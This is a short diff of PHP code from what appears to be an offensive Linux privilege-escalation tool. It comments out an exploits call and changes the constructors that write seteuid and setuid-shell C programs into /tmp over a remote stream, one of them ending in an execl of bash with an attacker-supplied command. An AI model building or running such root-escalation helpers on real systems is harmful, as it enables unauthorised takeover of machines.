@@ -389,7 +389,7 @@ class lan4linux extends LAN{
             //if (!$this->ip2root8db($this->ip2id)) {$this->suids($this->stream);$this->pause();}
             //if (!$this->ip2root8db($this->ip2id)) {$this->users($this->stream);$this->pause();}
             //if (!$this->ip2root8db($this->ip2id)) {$this->jobs($this->stream);$this->pause();}
-            if (!$this->ip2root8db($this->ip2id)) {$this->exploits($this->stream);$this->pause();}
+            //if (!$this->ip2root8db($this->ip2id)) {$this->exploits($this->stream);$this->pause();}
         }
         
         $this->lan2brief();
@@ -582,7 +582,7 @@ return 0;
 EOC;
             
             
-            $elf = new bin4linux("/tmp/seteuid_id_$euid_name");
+            $elf = new bin4linux($stream,"/tmp/seteuid_id_$euid_name");
             $query = "echo '$seteuid' > $elf->file_path.c  ";
             $this->req_str($stream,$query,$this->stream_timeout,"");
             $query = "ls -al $elf->file_path.c ";
@@ -630,7 +630,7 @@ execl("/bin/bash","bash","-c",argv[1], NULL);
 return 0;
 }
 EOC;
-                    $elf = new bin4linux("/tmp/shell_id_$euid_name");
+                    $elf = new bin4linux($stream,"/tmp/shell_id_$euid_name");
                     $query = "echo '$seteuid' > $elf->file_path.c  ";
                     $this->req_str($stream,$query,$this->stream_timeout,"");
                     $query = "ls -al $elf->file_path.c ";
